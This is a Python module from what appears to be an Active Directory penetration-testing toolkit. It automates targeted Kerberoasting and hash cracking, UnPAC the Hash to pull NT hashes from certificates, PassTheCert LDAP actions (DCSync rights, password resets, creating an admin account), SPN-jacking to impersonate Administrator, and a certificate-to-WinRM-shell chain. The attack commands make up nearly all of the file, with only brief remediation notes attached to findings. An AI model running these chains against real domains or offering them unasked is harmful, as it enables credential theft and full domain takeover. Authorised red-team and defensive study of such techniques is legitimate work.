"""
Module: UnPAC the Hash, PassTheCert & Targeted Kerberoasting
Techniques:
  - Targeted Kerberoasting via WriteServicePrincipalName / GenericWrite
  - UnPAC the Hash (S4U2Self + U2U — cert → NT hash)
  - PassTheCert (LDAP Schannel — no PKINIT needed)
  - SPN-Jacking (temporary SPN reassignment for delegation abuse)
"""
from utils.helpers import *
from config.settings import SESSION

MENU = """
  ── TARGETED KERBEROAST / UNPAC / PASSTHECERT ───────────────────
  [1]  Targeted Kerberoasting      (GenericWrite → WriteSPN → roast)
  [2]  UnPAC the Hash              (cert → NT hash via S4U2Self+U2U)
  [3]  PassTheCert                 (LDAP auth with cert, no TGT)
  [4]  SPN-Jacking                 (hijack SPN for delegation abuse)
  [5]  Certificate → Shell Chain   (cert → UnPAC → PTH → shell)
  [0]  Back
"""


def run():
    print_banner("TARGETED KERBEROAST / UNPAC / PASSTHECERT")
    dc   = input_or_session("dc_ip",    "DC IP")
    dom  = input_or_session("domain",   "Domain")
    user = input_or_session("username", "Username")
    pw   = input_or_session("password", "Password")

    krb  = SESSION.get("use_kerberos") and SESSION.get("krb5_ccache")
    fqdn = SESSION.get("dc_fqdn") or f"dc1.{dom}"

    if krb:
        ccache   = SESSION["krb5_ccache"]
        env_pre  = f"KRB5CCNAME={ccache} "
        ba_auth  = f"-k --host {fqdn} -d {dom} -u {user}"
        imp_auth = f"{dom}/{user} -k -no-pass"
    else:
        env_pre  = ""
        ba_auth  = f"--host {fqdn} -d {dom} -u {user} -p '{pw}'"
        imp_auth = f"{dom}/{user}:'{pw}'"

    print(MENU)
    c = input(f"  {M}Choice:{RST} ").strip()

    # ── [1] Targeted Kerberoasting ────────────────────────────────────────────
    if c == "1":
        target = prompt("Target account (e.g. svc_backup, Administrator)")
        fake_spn = f"fake/{dom}"
        section("Step 1 — Add SPN to target account (requires GenericWrite/WriteSPN)")
        run_cmd(f"bloodyAD {ba_auth} set object '{target}' "
                f"servicePrincipalName -v '{fake_spn}'")

        section("Step 2 — Kerberoast the target")
        run_cmd(f"{imp('GetUserSPNs.py')} {imp_auth} -dc-ip {dc} "
                f"-request -outputfile /tmp/targeted_roast.txt")

        section("Step 3 — Remove SPN (cleanup)")
        run_cmd(f"bloodyAD {ba_auth} remove object '{target}' "
                f"servicePrincipalName -v '{fake_spn}'")

        section("Crack")
        info("hashcat -m 13100 /tmp/targeted_roast.txt /usr/share/wordlists/rockyou.txt")
        add_finding("Targeted Kerberoasting", "High",
                    f"SPN added to {target} → TGS hash captured",
                    "Restrict WriteSPN ACL; audit SPN changes (Event ID 4742)")

    # ── [2] UnPAC the Hash ────────────────────────────────────────────────────
    elif c == "2":
        pfx         = prompt("PFX certificate file")
        target_user = prompt(f"Certificate subject user (default: {user})") or user
        section("certipy auth — automatically performs UnPAC")
        run_cmd(f"{env_pre}certipy auth -pfx '{pfx}' -domain {dom} "
                f"-dc-ip {dc} -username '{target_user}'")
        print(f"""
  {NEON_CYN}Manual UnPAC via PKINITtools:{RST}
  python3 /opt/PKINITtools/gettgtpkinit.py -cert-pfx '{pfx}' \\
    -dc-ip {dc} {dom}/{target_user} /tmp/{target_user}_pkinit.ccache
  export KRB5CCNAME=/tmp/{target_user}_pkinit.ccache
  python3 /opt/PKINITtools/getnthash.py {dom}/{target_user} \\
    -key <session_key_from_klist>
""")

    # ── [3] PassTheCert ───────────────────────────────────────────────────────
    elif c == "3":
        pfx    = prompt("PFX file path")
        action = prompt("Action [ldap-shell/dcsync/modify_user/add_user]") or "ldap-shell"
        target = prompt("Target account (for modify_user/add_user)") or ""
        new_pw = prompt("New password (for modify_user, blank = skip)") or ""

        base_cmd = (f"python3 /opt/passthecert/passthecert.py "
                    f"-pfx-cert '{pfx}' -dc-ip {dc} -domain {dom}")
        if action == "ldap-shell":
            run_cmd(f"{base_cmd} --action ldap-shell")
        elif action == "dcsync":
            run_cmd(f"{base_cmd} --action ldap-shell")
            info("In ldap-shell: type 'dcsync' or use 'elevate' to grant DCSync rights")
        elif action == "modify_user" and target:
            cmd = f"{base_cmd} --action modify_user --target '{target}'"
            if new_pw:
                cmd += f" --new-pass '{new_pw}'"
            else:
                cmd += " --elevate"
            run_cmd(cmd)
        elif action == "add_user":
            new_user = prompt("New admin username to create")
            run_cmd(f"{base_cmd} --action add_user --new-user '{new_user}' "
                    f"--new-pass 'P@ssw0rd123!'")
        add_finding("PassTheCert LDAP Auth", "Critical",
                    "Certificate used for LDAP Schannel auth — full AD control without TGT",
                    "Require LDAP signing + channel binding; disable TLS cert auth on LDAP")

    # ── [4] SPN-Jacking ───────────────────────────────────────────────────────
    elif c == "4":
        victim_spn = prompt("SPN to hijack (e.g. MSSQLSvc/db01.corp.local:1433)")
        source_obj = prompt("Object that currently owns the SPN")
        atk_obj    = prompt("Attacker-controlled object to assign SPN to")
        print(f"""
  {NEON_CYN}SPN-Jacking — Temporary SPN Reassignment:{RST}
  {DIM}With WriteSPN on {source_obj}, temporarily move the SPN to {atk_obj}
  which has delegation rights. Perform S4U impersonation, then restore.{RST}

  ── Step 1: Remove SPN from original object ───────────────────────────────
  bloodyAD {ba_auth} remove object '{source_obj}' \\
    servicePrincipalName -v '{victim_spn}'

  ── Step 2: Add SPN to attacker object ───────────────────────────────────
  bloodyAD {ba_auth} set object '{atk_obj}' \\
    servicePrincipalName -v '{victim_spn}'

  ── Step 3: S4U2Self + S4U2Proxy impersonation ────────────────────────────
  {imp('getST.py')} -spn '{victim_spn}' -impersonate Administrator \\
    {imp_auth} -dc-ip {dc}
  export KRB5CCNAME=Administrator@{victim_spn.replace('/','_')}.ccache

  ── Step 4: Restore SPN (cleanup) ────────────────────────────────────────
  bloodyAD {ba_auth} remove object '{atk_obj}' \\
    servicePrincipalName -v '{victim_spn}'
  bloodyAD {ba_auth} set object '{source_obj}' \\
    servicePrincipalName -v '{victim_spn}'
""")
        add_finding("SPN-Jacking", "High",
                    f"SPN {victim_spn} temporarily reassigned for delegation abuse",
                    "Audit SPN changes (Event 4742); restrict WriteSPN ACL")

    # ── [5] Full chain ────────────────────────────────────────────────────────
    elif c == "5":
        pfx    = prompt("Certificate PFX path")
        target = prompt(f"Account in cert (default: {user})") or user
        print(f"\n  {NEON_CYN}Certificate → Shell Full Chain:{RST}\n")
        section("Step 1: UnPAC → get NT hash")
        run_cmd(f"{env_pre}certipy auth -pfx '{pfx}' -domain {dom} "
                f"-dc-ip {dc} -username '{target}'")
        section("Step 2: evil-winrm with NT hash (if Step 1 gives hash)")
        info(f"evil-winrm -i {fqdn} -u '{target}' -H <NT_HASH>")
        section("Step 3: OR use TGT directly (from certipy auth)")
        info(f"export KRB5CCNAME={target}.ccache")
        info(f"evil-winrm -i {fqdn} -r {dom.upper()}")

    pause()
